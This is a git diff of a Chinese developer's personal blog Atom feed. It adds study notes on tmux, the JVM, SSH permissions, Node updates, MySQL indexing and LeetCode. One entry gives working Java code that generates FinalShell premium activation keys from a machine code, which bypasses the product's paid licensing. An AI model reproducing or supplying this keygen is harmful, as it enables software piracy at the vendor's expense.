@@ -4,7 +4,7 @@
   <title><![CDATA[Sajor's Blog]]></title>
   <link href="http://565785929.github.io/atom.xml" rel="self"/>
   <link href="http://565785929.github.io/"/>
-  <updated>2021-10-04T00:02:03+08:00</updated>
+  <updated>2022-01-05T11:26:45+08:00</updated>
   <id>http://565785929.github.io/</id>
   <author>
     <name><![CDATA[]]></name>
@@ -12,6 +12,671 @@
   </author>
   <generator uri="http://www.coderforart.com/">CoderForArt</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Vim 跳转技巧]]></title>
+    <link href="http://565785929.github.io/16413527990433.html"/>
+    <updated>2022-01-05T11:19:59+08:00</updated>
+    <id>http://565785929.github.io/16413527990433.html</id>
+    <content type="html"><![CDATA[
+<p><img src="media/16413527990433/16413528368917.jpg" alt=""/></p>
+
+<p><img src="media/16405110285297/16412884491803.jpg" alt=""/></p>
+
+<p><img src="media/16405110285297/16412867101612.jpg" alt=""/></p>
+
+<p><img src="media/16405110285297/16412866952994.jpg" alt=""/></p>
+
+<p><img src="media/16405110285297/16412886197662.jpg" alt=""/></p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[tmux]]></title>
+    <link href="http://565785929.github.io/16408435425370.html"/>
+    <updated>2021-12-30T13:52:22+08:00</updated>
+    <id>http://565785929.github.io/16408435425370.html</id>
+    <content type="html"><![CDATA[
+<p><img src="media/16408435425370/16408437247844.jpg" alt=""/></p>
+
+<h2 id="toc_0">安装</h2>
+
+<p>使用包管理工具</p>
+
+<pre class="line-numbers"><code class="language-text"># Ubuntu 或 Debian
+$ sudo apt-get install tmux
+
+# CentOS 或 Fedora
+$ sudo yum install tmux
+
+# Mac
+$ brew install tmux
+</code></pre>
+
+<h2 id="toc_1">session 会话管理</h2>
+
+<h3 id="toc_2">1. 新建会话</h3>
+
+<p>第一个启动的 Tmux 窗口，编号是0，第二个窗口的编号是1，以此类推。这些窗口对应的会话，就是 0 号会话、1 号会话。</p>
+
+<p>使用编号区分会话，不太直观，更好的方法是为会话起名。</p>
+
+<pre class="line-numbers"><code class="language-text">$ tmux new -s &lt;session-name&gt;
+</code></pre>
+
+<p>上面命令新建一个指定名称的会话。</p>
+
+<h3 id="toc_3">2. 分离会话</h3>
+
+<p>在 Tmux 窗口中，按下<code>Ctrl+b d</code>或者输入<code>tmux detach</code>命令，就会将当前会话与窗口分离。</p>
+
+<pre class="line-numbers"><code class="language-text">$ tmux detach
+</code></pre>
+
+<p>上面命令执行后，就会退出当前 Tmux 窗口，但是会话和里面的进程仍然在后台运行。</p>
+
+<p>tmux ls命令可以查看当前所有的 Tmux 会话。</p>
+
+<pre class="line-numbers"><code class="language-text">$ tmux ls
+# or
+$ tmux list-session
+</code></pre>
+
+<h3 id="toc_4">3. 接入会话</h3>
+
+<p><code>tmux attach</code>命令用于重新接入某个已存在的会话。</p>
+
+<pre class="line-numbers"><code class="language-text"># 使用会话编号
+$ tmux attach -t 0
+
+# 使用会话名称
+$ tmux attach -t &lt;session-name&gt;
+</code></pre>
+
+<h3 id="toc_5">4. 杀死会话</h3>
+
+<p><code>tmux kill-session</code>命令用于杀死某个会话。</p>
+
+<pre class="line-numbers"><code class="language-text"># 使用会话编号
+$ tmux kill-session -t 0
+
+# 使用会话名称
+$ tmux kill-session -t &lt;session-name&gt;
+</code></pre>
+
+<h3 id="toc_6">5. 切换会话</h3>
+
+<p><code>tmux switch</code>命令用于切换会话。</p>
+
+<pre class="line-numbers"><code class="language-text"># 使用会话编号
+$ tmux switch -t 0
+
+# 使用会话名称
+$ tmux switch -t &lt;session-name&gt;
+</code></pre>
+
+<h3 id="toc_7">6. 重命名会话</h3>
+
+<p><code>tmux rename-session</code>命令用于重命名会话。</p>
+
+<pre class="line-numbers"><code class="language-text">$ tmux rename-session -t 0 &lt;new-name&gt;
+上面命令将0号会话重命名。
+</code></pre>
+
+<h3 id="toc_8">7. 会话快捷键</h3>
+
+<p>下面是一些会话相关的快捷键。</p>
+
+<pre class="line-numbers"><code class="language-text">Ctrl+b d：分离当前会话。
+Ctrl+b s：列出所有会话。
+Ctrl+b $：重命名当前会话。
+</code></pre>
+
+<h3 id="toc_9">session 总结</h3>
+
+<p>session 在 tmux 操作当中非常重要，希望你可以熟练的使用以上操作：</p>
+
+<p>新建 session -&gt; 离开 session -&gt; 查看 session 列表 -&gt; 进入 session -&gt; 关闭 session -&gt; 不同 session 之间的切换 -&gt; 重命名 session</p>
+
+<pre class="line-numbers"><code class="language-text">tmux new -s &lt;session-name&gt;
+tmux detach                                      # Ctrl+b d 
+tmux ls                                          # Ctrl+b s
+tmux attach -t &lt;session-name&gt; 
+tmux kill-session -t &lt;session-name&gt;              # Ctrl+d
+tmux switch -t &lt;session-name&gt;
+tmux rename-session -t &lt;old-name&gt; &lt;new-name&gt;     # Ctrl+b $
+</code></pre>
+
+<h2 id="toc_10">pane 窗格管理</h2>
+
+<p>待续。</p>
+
+<p>来源：<a href="https://zhuanlan.zhihu.com/p/102546608">知乎</a>、<a href="http://www.ruanyifeng.com/blog/2019/10/tmux.html">阮一峰的网络日志</a></p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[JVM 内存模型]]></title>
+    <link href="http://565785929.github.io/16405110285297.html"/>
+    <updated>2021-12-26T17:30:28+08:00</updated>
+    <id>http://565785929.github.io/16405110285297.html</id>
+    <content type="html"><![CDATA[
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[JVM 类加载器]]></title>
+    <link href="http://565785929.github.io/16405090873022.html"/>
+    <updated>2021-12-26T16:58:07+08:00</updated>
+    <id>http://565785929.github.io/16405090873022.html</id>
+    <content type="html"><![CDATA[
+<p>类的生命周期：</p>
+
+<ul>
+<li>加载：找到Class文件</li>
+<li>验证：验证格式、依赖</li>
+<li>准备：静态字段、方法表</li>
+<li>解析：符号解析为引用</li>
+<li>初始化：构造器、静态变量赋值、静态代码块</li>
+<li>使用</li>
+<li>卸载</li>
+</ul>
+
+<p><img src="media/16405090873022/16405092178762.jpg" alt="" style="width:402px;"/></p>
+
+<h2 id="toc_0">类的加载时机</h2>
+
+<p><img src="media/16405090873022/16405097616339.jpg" alt="" style="width:735px;"/></p>
+
+<ol>
+<li>当虚拟机启动时，初始化用户指定的主类，就是启动执行的main方法所在的类；</li>
+<li>当遇到用以新建目标类示例的new指令时，初始化new指定的目标类，就是new一个类的时候要初始化；</li>
+<li>当遇到调用静态方法的指令时，初始化该静态方法所在的类；</li>
+<li>当遇到访问静态字段的指令时，初始化该静态方法所在的类；</li>
+<li>子类的初始化会触发父类的初始化；</li>
+<li>如果一个接口定义了default方法，那么直接实现或者间接实现该接口的类的初始化，会触发该接口的初始化；</li>
+<li>使用反射API对某个类进行反射调用时，初始化这个类，其实跟前面一样，反射调用要么事已经有实例了，要么是静态方法，都需要初始化；</li>
+<li>当初次调用MethodHandle实例时，初始化该MethodHandle指向的方法所在的类；</li>
+</ol>
+
+<h2 id="toc_1">不会初始化（可能会加载）</h2>
+
+<p><img src="media/16405090873022/16405099836639.jpg" alt="" style="width:733px;"/></p>
+
+<h2 id="toc_2">三类加载器</h2>
+
+<ol>
+<li>启动类加载器</li>
+<li>拓展类加载器</li>
+<li>应用类加载器</li>
+</ol>
+
+<p><strong>加载器特点</strong></p>
+
+<ol>
+<li>双亲委托</li>
+<li>负责依赖</li>
+<li>缓存加载</li>
+</ol>
+
+<p><img src="media/16405090873022/16405101923617.jpg" alt="" style="width:835px;"/></p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[JVM 字节码]]></title>
+    <link href="http://565785929.github.io/16405067982525.html"/>
+    <updated>2021-12-26T16:19:58+08:00</updated>
+    <id>http://565785929.github.io/16405067982525.html</id>
+    <content type="html"><![CDATA[
+<p>有一个简单的类 </p>
+
+<pre class="line-numbers"><code class="language-text">class Hello {
+        public static void main(String[] agrs) {
+                Hello obj = new Hello();
+        }
+}
+</code></pre>
+
+<p>编译：<code>javac Hello.java</code><br/>
+查看字节码：<code>javap -c Hello.class</code></p>
+
+<p><img src="media/16405067982525/16405070154518.jpg" alt="" style="width:613px;"/></p>
+
+<p>运算应在栈上操作，所以应该先将变量从本地变量表中加载到栈上，运算完成后再储存回本地变量表。</p>
+
+<p><img src="media/16405067982525/16405072357620.jpg" alt="" style="width:220px;"/></p>
+
+<p>更详细的内容：<code>javap -c -verbose Hello.class</code></p>
+
+<pre class="line-numbers"><code class="language-text">&gt;&gt; javap -c -verbose ./Hello.class
+
+Classfile /Users/sajor/Desktop/jvm/Hello.class
+  Last modified 2021-12-26; size 272 bytes
+  MD5 checksum ad7dbc8f3a6688a6991501a51cebaa71
+  Compiled from &quot;Hello.java&quot;
+class Hello
+  minor version: 0
+  major version: 52
+  flags: ACC_SUPER
+Constant pool:
+   #1 = Methodref          #4.#13         // java/lang/Object.&quot;&lt;init&gt;&quot;:()V
+   #2 = Class              #14            // Hello
+   #3 = Methodref          #2.#13         // Hello.&quot;&lt;init&gt;&quot;:()V
+   #4 = Class              #15            // java/lang/Object
+   #5 = Utf8               &lt;init&gt;
+   #6 = Utf8               ()V
+   #7 = Utf8               Code
+   #8 = Utf8               LineNumberTable
+   #9 = Utf8               main
+  #10 = Utf8               ([Ljava/lang/String;)V
+  #11 = Utf8               SourceFile
+  #12 = Utf8               Hello.java
+  #13 = NameAndType        #5:#6          // &quot;&lt;init&gt;&quot;:()V
+  #14 = Utf8               Hello
+  #15 = Utf8               java/lang/Object
+{
+  Hello();
+    descriptor: ()V
+    flags:
+    Code:
+      stack=1, locals=1, args_size=1
+         0: aload_0
+         1: invokespecial #1                  // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V
+         4: return
+      LineNumberTable:
+        line 1: 0
+
+  public static void main(java.lang.String[]);
+    descriptor: ([Ljava/lang/String;)V
+    flags: ACC_PUBLIC, ACC_STATIC
+    Code:
+      stack=2, locals=2, args_size=1
+         0: new           #2                  // class Hello
+         3: dup
+         4: invokespecial #3                  // Method &quot;&lt;init&gt;&quot;:()V
+         7: astore_1
+         8: return
+      LineNumberTable:
+        line 3: 0
+        line 4: 8
+}
+SourceFile: &quot;Hello.java&quot;
+</code></pre>
+
+<p><img src="media/16405067982525/16405076823829.jpg" alt="" style="width:816px;"/></p>
+
+<p>算数操作与类型转换</p>
+
+<p><img src="media/16405067982525/16405079652324.jpg" alt="" style="width:743px;"/></p>
+
+<h2 id="toc_0">小例子：</h2>
+
+<pre class="line-numbers"><code class="language-java">class Hello {
+        public static void main(String[] agrs) {
+                int a = 2;
+                int b = 1;
+                int c = a + b * 5;
+        }
+}
+</code></pre>
+
+<p>字节码为如下</p>
+
+<p><img src="media/16405067982525/16405090059683.jpg" alt="" style="width:596px;"/></p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Final Shell离线激活]]></title>
+    <link href="http://565785929.github.io/16402262289586.html"/>
+    <updated>2021-12-23T10:23:48+08:00</updated>
+    <id>http://565785929.github.io/16402262289586.html</id>
+    <content type="html"><![CDATA[
+<p><img src="media/16402262289586/16413518433356.jpg" alt=""/></p>
+
+<h2 id="toc_0">使用FinalShell离线激活方式升级高级版本</h2>
+
+<p>使用FinalShell离线激活方式升级高级版本</p>
+
+<p><img src="media/16402262289586/16413519039476.jpg" alt=""/></p>
+
+<p>获取机器码(如果没有就随意输入用户名或密码执行登录)</p>
+
+<p><img src="media/16402262289586/16413519102850.jpg" alt=""/></p>
+
+<p>执行下面代码,输入机器码获取激活码<br/>
+<img src="media/16402262289586/16413520061027.jpg" alt=""/></p>
+
+<pre class="line-numbers"><code class="language-text">import java.io.IOException;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
+import java.util.Scanner;
+
+
+class FinalShell {
+    public static void main(String[] args) throws NoSuchAlgorithmException, IOException {
+        System.out.print(&quot;请输入FinalShell的离线机器码：&quot;);
+        Scanner reader = new Scanner(System.in);
+        String machineCode = reader.nextLine();
+        generateKey(machineCode);
+    }
+
+    public static void generateKey(String hardwareId) throws NoSuchAlgorithmException {
+        String proKey = transform(61305 + hardwareId + 8552);
+        String pfKey = transform(2356 + hardwareId + 13593);
+        System.out.println(&quot;请将此行复制到离线激活中：&quot; + proKey);
+        System.out.println(pfKey);
+    }
+
+    public static String transform(String str) throws NoSuchAlgorithmException {
+
+        String md5 = hashMD5(str);
+
+        return hashMD5(str).substring(8, 24);
+    }
+
+    public static String hashMD5(String str) throws NoSuchAlgorithmException {
+        MessageDigest digest = MessageDigest.getInstance(&quot;MD5&quot;);
+        byte[] hashed = digest.digest(str.getBytes());
+        StringBuilder sb = new StringBuilder();
+        for (byte b : hashed) {
+            int len = b &amp; 0xFF;
+            if (len &lt; 16) {
+                sb.append(&quot;0&quot;);
+            }
+            sb.append(Integer.toHexString(len));
+        }
+        return sb.toString();
+    }
+}
+</code></pre>
+
+<p>成功激活</p>
+
+<p><img src="media/16402262289586/16413520217200.jpg" alt=""/></p>
+
+<p>来源：<a href="http://www.cxyax.com/?post=490">FinalShell 离线激活</a></p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[设置ssh免密码登陆 不生效]]></title>
+    <link href="http://565785929.github.io/16378305266660.html"/>
+    <updated>2021-11-25T16:55:26+08:00</updated>
+    <id>http://565785929.github.io/16378305266660.html</id>
+    <content type="html"><![CDATA[
+<p><img src="media/16378305266660/16413525261167.jpg" alt=""/></p>
+
+<h2 id="toc_0">问题：</h2>
+
+<p>设置ssh免密码登陆的时候，发现有一些机器设置不生效。有一些机器正常。</p>
+
+<h2 id="toc_1">跟踪</h2>
+
+<p>登陆目标机器，查看sshd的日志信息。日志信息目录为，/var/log/secure<br/>
+你会发现如下字样的日志信息。</p>
+
+<pre class="line-numbers"><code class="language-text">Jul 22 14:20:33 v138020.go sshd[4917]: Authentication refused: bad ownership or modes for directory /home/xinhailong
+</code></pre>
+
+<h2 id="toc_2">原因</h2>
+
+<p>sshd为了安全，对属主的目录和文件权限有所要求。如果权限不对，则ssh的免密码登陆不生效。<br/>
+用户目录权限为 755 或者 700，就是不能是77x。<br/>
+.ssh目录权限一般为755或者700。<br/>
+rsa_id.pub 及authorized_keys权限一般为644<br/>
+rsa_id权限必须为600</p>
+
+<h2 id="toc_3">解决方法</h2>
+
+<p>检测目录权限，把不符合要求的按要求设置权限即可。</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Mac 更新 node 版本]]></title>
+    <link href="http://565785929.github.io/16353269752301.html"/>
+    <updated>2021-10-27T17:29:35+08:00</updated>
+    <id>http://565785929.github.io/16353269752301.html</id>
+    <content type="html"><![CDATA[
+<p><img src="media/16353269752301/16413526184515.jpg" alt=""/></p>
+
+<p>第一步，先查看本机node.js版本：</p>
+
+<p>node -v</p>
+
+<p>第二步，清除node.js的cache：</p>
+
+<p>sudo npm cache clean -f</p>
+
+<p>第三步，安装 n 工具，这个工具是专门用来管理node.js版本的，别怀疑这个工具的名字，是他是他就是他，他的名字就是 &quot;n&quot;</p>
+
+<p>sudo npm install -g n</p>
+
+<p>第四步，安装最新版本的node.js</p>
+
+<p>sudo n stable</p>
+
+<p>第五步，再次查看本机的node.js版本：</p>
+
+<p>node -v</p>
+
+<p>第六步，更新npm到最新版：</p>
+
+<p>$ sudo npm install npm@latest -g</p>
+
+<p>第七步，验证</p>
+
+<p>node -v<br/>
+npm -v</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[join 语句]]></title>
+    <link href="http://565785929.github.io/16351769421565.html"/>
+    <updated>2021-10-25T23:49:02+08:00</updated>
+    <id>http://565785929.github.io/16351769421565.html</id>
+    <content type="html"><![CDATA[
+<p>I</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[14 | count(*)这么慢，我该怎么办？]]></title>
+    <link href="http://565785929.github.io/16345712700520.html"/>
+    <updated>2021-10-18T23:34:30+08:00</updated>
+    <id>http://565785929.github.io/16345712700520.html</id>
+    <content type="html"><![CDATA[
+<h2 id="toc_0">count(*) 的实现方式</h2>
+
+<p>你首先要明确的是，在不同的 MySQL 引擎中，count(*) 有不同的实现方式。</p>
+
+<ul>
+<li>MyISAM 引擎把一个表的总行数存在了磁盘上，因此执行 count(*) 的时候会直接返回这个数，效率很高；</li>
+<li>而 InnoDB 引擎就麻烦了，它执行 count(*) 的时候，需要把数据一行一行地从引擎里面读出来，然后累积计数。</li>
+</ul>
+
+<p>这里需要注意的是，我们在这篇文章里讨论的是没有过滤条件的 count(*)，如果加了 where 条件的话，MyISAM 表也是不能返回得这么快的。</p>
+
+<h2 id="toc_1">计数的几种方式</h2>
+
+<ul>
+<li>MyISAM 表虽然 count(*) 很快，但是不支持事务；</li>
+<li>show table status 命令虽然返回很快，但是不准确；</li>
+<li>InnoDB 表直接 count(*) 会遍历全表，虽然结果准确，但会导致性能问题。</li>
+</ul>
+
+<h2 id="toc_2">不同的 count 用法</h2>
+
+<p>所以，count(*)、count(主键 id) 和 count(1) 都表示返回满足条件的结果集的总行数；而 count(字段），则表示返回满足条件的数据行里面，参数“字段”不为 NULL 的总个数。</p>
+
+<p>至于分析性能差别的时候，你可以记住这么几个原则：</p>
+
+<ul>
+<li>server 层要什么就给什么；</li>
+<li>InnoDB 只给必要的值；</li>
+<li>现在的优化器只优化了 count(*) 的语义为“取行数”，其他“显而易见”的优化并没有做。</li>
+</ul>
+
+<p><strong>对于 count(主键 id) 来说</strong>，InnoDB 引擎会遍历整张表，把每一行的 id 值都取出来，返回给 server 层。server 层拿到 id 后，判断是不可能为空的，就按行累加。</p>
+
+<p><strong>对于 count(1) 来说</strong>，InnoDB 引擎遍历整张表，但不取值。server 层对于返回的每一行，放一个数字“1”进去，判断是不可能为空的，按行累加。</p>
+
+<p>单看这两个用法的差别的话，你能对比出来，count(1) 执行得要比 count(主键 id) 快。因为从引擎返回 id 会涉及到解析数据行，以及拷贝字段值的操作。</p>
+
+<p><strong>对于 count(字段) 来说</strong>：</p>
+
+<ol>
+<li><p>如果这个“字段”是定义为 not null 的话，一行行地从记录里面读出这个字段，判断不能为 null，按行累加；</p></li>
+<li><p>如果这个“字段”定义允许为 null，那么执行的时候，判断到有可能是 null，还要把值取出来再判断一下，不是 null 才累加。</p></li>
+</ol>
+
+<p>也就是前面的第一条原则，server 层要什么字段，InnoDB 就返回什么字段。</p>
+
+<p><strong>但是 count(*) 是例外</strong>，并不会把全部字段取出来，而是专门做了优化，不取值。count(*) 肯定不是 null，按行累加。</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[13 重构数据库]]></title>
+    <link href="http://565785929.github.io/16345707563290.html"/>
+    <updated>2021-10-18T23:25:56+08:00</updated>
+    <id>http://565785929.github.io/16345707563290.html</id>
+    <content type="html"><![CDATA[
+<p>GitHub&#39;s Online Schema Migrations for MySQL<br/>
+(<a href="https://github.com/github/gh-ost">https://github.com/github/gh-ost</a>)</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Linux 系统的启动过程]]></title>
+    <link href="http://565785929.github.io/16343110664613.html"/>
+    <updated>2021-10-15T23:17:46+08:00</updated>
+    <id>http://565785929.github.io/16343110664613.html</id>
+    <content type="html"><![CDATA[
+<ul>
+<li>内核的引导</li>
+<li>运行init</li>
+<li>系统初始化</li>
+<li>建立终端 </li>
+<li>用户登录系统</li>
+</ul>
+
+<p><img src="media/16343110664613/16343111820817.jpg" alt=""/></p>
+
+<h2 id="toc_0">内核引导</h2>
+
+<p>当计算机打开电源后，首先是BIOS开机自检，按照BIOS中设置的启动设备（通常是硬盘）来启动。</p>
+
+<p>操作系统接管硬件以后，首先读入 /boot 目录下的内核文件。</p>
+
+<h2 id="toc_1">运行init</h2>
+
+<p>init 进程是系统所有进程的起点，你可以把它比拟成系统所有进程的老祖宗，没有这个进程，系统中任何进程都不会启动。</p>
+
+<p>init 程序首先是需要读取配置文件 /etc/inittab。</p>
+
+<h2 id="toc_2">运行级别</h2>
+
+<p>许多程序需要开机启动。它们在Windows叫做&quot;服务&quot;（service），在Linux就叫做&quot;守护进程&quot;（daemon）。</p>
+
+<p>init进程的一大任务，就是去运行这些开机启动的程序。</p>
+
+<p>但是，不同的场合需要启动不同的程序，比如用作服务器时，需要启动Apache，用作桌面就不需要。</p>
+
+<p>Linux允许为不同的场合，分配不同的开机启动程序，这就叫做&quot;运行级别&quot;（runlevel）。也就是说，启动时根据&quot;运行级别&quot;，确定要运行哪些程序。</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[栈 队列 双端队列（Stack & Queue & Deque）]]></title>
+    <link href="http://565785929.github.io/16341349844977.html"/>
+    <updated>2021-10-13T22:23:04+08:00</updated>
+    <id>http://565785929.github.io/16341349844977.html</id>
+    <content type="html"><![CDATA[
+<p><a href="http://www.bigocheatsheet.com">www.bigocheatsheet.com</a></p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[numpy]]></title>
+    <link href="http://565785929.github.io/16339276945488.html"/>
+    <updated>2021-10-11T12:48:14+08:00</updated>
+    <id>http://565785929.github.io/16339276945488.html</id>
+    <content type="html"><![CDATA[
+<p>用于高性能科学计算和数据分析，是常用的高级数据分析库的基础包</p>
+
+<h1 id="toc_0">pandas</h1>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[LeetCode 217.存在重复元素]]></title>
+    <link href="http://565785929.github.io/16332772077185.html"/>
+    <updated>2021-10-04T00:06:47+08:00</updated>
+    <id>http://565785929.github.io/16332772077185.html</id>
+    <content type="html"><![CDATA[
+<p>题目链接：<a href="https://leetcode-cn.com/problems/contains-duplicate/">contains-duplicate</a></p>
+
+<blockquote>
+<p>给定一个整数数组，判断是否存在重复元素。</p>
+
+<p>如果存在一值在数组中出现至少两次，函数返回 true 。如果数组中每个元素都不相同，则返回 false 。</p>
+
+<p>示例 1:</p>
+
+<p>输入: [1,2,3,1]<br/>
+输出: true<br/>
+示例 2:</p>
+
+<p>输入: [1,2,3,4]<br/>
+输出: false<br/>
+示例 3:</p>
+
+<p>输入: [1,1,1,3,3,4,3,2,4,2]<br/>
+输出: true</p>
+</blockquote>
+
+<h2 id="toc_0">思考</h2>
+
+<p>此方法无法通过用例，Time Limit Exceeded。所以需要优化。</p>
+
+<p>解法一、暴力 \(O(n^2)\)</p>
+
+<pre class="line-numbers"><code class="language-python3">class Solution:
+    def containsDuplicate(self, nums: List[int]) -&gt; bool:
+        for i in range(len(nums) - 1):
+            for j in range(i+1, len(nums)):
+                if nums[i] == nums[j]:
+                    return True
+        return False
+</code></pre>
+
+<p>解法二、集合 \(O(n)\)</p>
+
+<pre class="line-numbers"><code class="language-python3">class Solution:
+    def containsDuplicate(self, nums: List[int]) -&gt; bool:
+        return len(nums) != len(set(nums))
+</code></pre>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[LeetCode 1. 两数之和]]></title>
@@ -126,6 +791,8 @@
     <content type="html"><![CDATA[
 <p>什么是ARTS打卡计划？</p>
 
+<p><img src="media/16332743074800/16413529946427.jpg" alt=""/></p>
+
 <h2 id="toc_0">Algorithm</h2>
 
 <p>每周至少做一个leetcode的算法题。主要是为了编程训练和学习。</p>
@@ -142,15 +809,205 @@
 
 <p>分享一篇有观点和思考的技术文章。主要是为了建立你的影响力，能够输出价值观。</p>
 
+<h1 id="toc_4">LeetCode刷题法</h1>
+
+<h2 id="toc_5">第一遍</h2>
+
+<ul>
+<li>5mins 读题+思考</li>
+<li>直接看解法：比较各个解法优劣</li>
+<li>背诵并默写好的解法<br/>
+## 第二遍</li>
+<li>马上自己写 -&gt; 提交LeetCode</li>
+<li>多种解法比较、体会 -&gt; 优化</li>
+</ul>
+
+<h2 id="toc_6">第三遍</h2>
+
+<ul>
+<li>过了一天之后，再重复做题</li>
+<li>不同解法的熟练程度 -&gt; 专项练习</li>
+</ul>
+
+<h2 id="toc_7">第四遍</h2>
+
+<ul>
+<li>过了一周：反复回来练习不熟练的</li>
+</ul>
+
+<h2 id="toc_8">第五遍</h2>
+
+<ul>
+<li>面试前一周恢复性训练</li>
+</ul>
+
+<p>要看国际站的题解 discuss</p>
+
+<p><a href="https://www.markhneedham.com/blog/2008/09/15/clean-code-book-review/">https://www.markhneedham.com/blog/2008/09/15/clean-code-book-review/</a></p>
+
+<h1 id="toc_9">学习方法</h1>
+
+<p>来自于 <outliers> 异类: 不一样的成功启示录</p>
+
+<p><img src="media/16321235553115/16322371489779.jpg" alt="" style="width:184px;"/></p>
+
+<ul>
+<li>Chunk it up 切碎知识点</li>
+<li>Deliberate Practicing 刻意练习</li>
+<li>feedback 反馈</li>
+</ul>
+
+<p><a href="http://naotu.baidu.com/file/b832f043e2ead159d584cca4efb19703?token=7a6a56eb2630548c">数据结构脑图</a><br/>
+<a href="http://naotu.baidu.com/file/0a53d3a5343bd86375f348b2831d3610?token=5ab1de1c90d5f3ec">算法脑图</a></p>
+
+<h2 id="toc_10">Chunk it up</h2>
+
+<p>做脑图</p>
+
+<p>来自reddit中ask me anything<br/>
+<img src="media/16321235553115/16321238197078.jpg" alt="" style="width:812px;"/></p>
+
+<h2 id="toc_11">数据结构分类</h2>
+
+<ul>
+<li>一维数据结构
+<ul>
+<li>基础</li>
+<li>数组 array(string)</li>
+<li>链表 linked list</li>
+<li>高级</li>
+<li>栈 stack</li>
+<li>队列 queue</li>
+<li>双端队列 deque(double-ended queue)</li>
+<li>集合 set</li>
+<li>映射 map(hash or map)</li>
+</ul></li>
+<li>二维数据结构
+<ul>
+<li>基础：</li>
+<li>树 tree</li>
+<li>图 graph</li>
+<li>高级：</li>
+<li>二叉搜索树 binary search tree(red-black tree, AVL)</li>
+<li>堆 heap</li>
+<li>并查集 disjoint set</li>
+<li>字典树 trie</li>
+</ul></li>
+<li>特殊数据结构
+<ul>
+<li>位运算 bitwise</li>
+<li>布隆过滤器 BloomFilter</li>
+<li>缓存 LRU Cache</li>
+</ul></li>
+</ul>
+
+<p><strong>切题四件套</strong></p>
+
+<ul>
+<li>Clarification 明确题意</li>
+<li>Possible solutions 思考多种方法
+<ul>
+<li>compare(time/space) 对比复杂度</li>
+<li>optimal 加强优化</li>
+</ul></li>
+<li>Coding 多写</li>
+<li>Test cases 用例</li>
+</ul>
+
 ]]></content>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[数据库上线规范]]></title>
+    <title type="html"><![CDATA[11 | 怎么给字符串字段加索引？]]></title>
     <link href="http://565785929.github.io/16330152348133.html"/>
     <updated>2021-09-30T23:20:34+08:00</updated>
     <id>http://565785929.github.io/16330152348133.html</id>
     <content type="html"><![CDATA[
+<h2 id="toc_0">什么是前缀索引？</h2>
+
+<p>给email字符串创建索引有</p>
+
+<pre class="line-numbers"><code class="language-text">mysql&gt; alter table SUser add index index1(email);
+或
+mysql&gt; alter table SUser add index index2(email(6));
+</code></pre>
+
+<p>索引选取的越长，占用的磁盘空间就越大，相同的数据页能放下的索引值就越少，搜索的效率也就会越低。</p>
+
+<p>由于email(6)这个索引结构中每个邮箱字段都只取前6个字节，所以占用的空间会更小，这就是使用前缀索引的优势。但，这同时带来的损失是，可能会增加额外的记录扫描次数。</p>
+
+<p>使用前缀索引，定义好长度，就可以做到既节省空间，又不用额外增加太多的查询成本。</p>
+
+<h2 id="toc_1">定义多长的前缀？</h2>
+
+<p>我们在建立索引时关注的是区分度，区分度越高越好。因为区分度越高，意味着重复的键值越少。因此，我们可以通过统计索引上有多少个不同的值来判断要使用多长的前缀。</p>
+
+<p>首先，算出这个列上有多少个不同的值</p>
+
+<p>然后，依次选取不同长度的前缀来看这个值，比如我们要看一下4~7个字节的前缀索引，可以用这个语句：</p>
+
+<pre class="line-numbers"><code class="language-text">mysql&gt; select 
+  count(distinct email) as L,
+  count(distinct left(email,4)）as L4,
+  count(distinct left(email,5)）as L5,
+  count(distinct left(email,6)）as L6,
+  count(distinct left(email,7)）as L7
+from SUser;
+</code></pre>
+
+<p>当然，使用前缀索引很可能会损失区分度，所以你需要预先设定一个可以接受的损失比例，比如5%。然后，在返回的L4~L7中，找出不小于 L * 95%的值，假设这里L6、L7都满足，你就可以选择前缀长度为6。</p>
+
+<h2 id="toc_2">前缀索引对覆盖索引的影响</h2>
+
+<p>使用前缀索引用不上覆盖索引对查询性能的优化</p>
+
+<p>虽然你创建了联合索引，查询字段已经覆盖在联合索引中了，但InnoDB还是要回到id索引再查一下，因为系统并不确定前缀索引的定义是否截断了完整信息。</p>
+
+<h2 id="toc_3">其他方式</h2>
+
+<p>第一种方式是使用<strong>倒序存储</strong>。如果你存储身份证号的时候把它倒过来存，由于身份证号的最后6位没有地址码这样的重复逻辑，所以最后这6位很可能就提供了足够的区分度。当然了，实践中你不要忘记使用count(distinct)方法去做个验证。</p>
+
+<p>每次查询的时候，你可以这么写：</p>
+
+<pre class="line-numbers"><code class="language-text">mysql&gt; select field_list from t where id_card = reverse(&#39;input_id_card_string&#39;);
+</code></pre>
+
+<p>第二种方式是<strong>使用hash字段</strong>。你可以在表上再创建一个整数字段，来保存身份证的校验码，同时在这个字段上创建索引</p>
+
+<pre class="line-numbers"><code class="language-text">mysql&gt; alter table t add id_card_crc int unsigned, add index(id_card_crc);
+</code></pre>
+
+<p>然后每次插入新记录的时候，都同时用crc32()这个函数得到校验码填到这个新字段。由于校验码可能存在冲突，也就是说两个不同的身份证号通过crc32()函数得到的结果可能是相同的，所以你的查询语句where部分要判断id_card的值是否精确相同。</p>
+
+<p>这样，索引的长度变成了4个字节，比原来小了很多。</p>
+
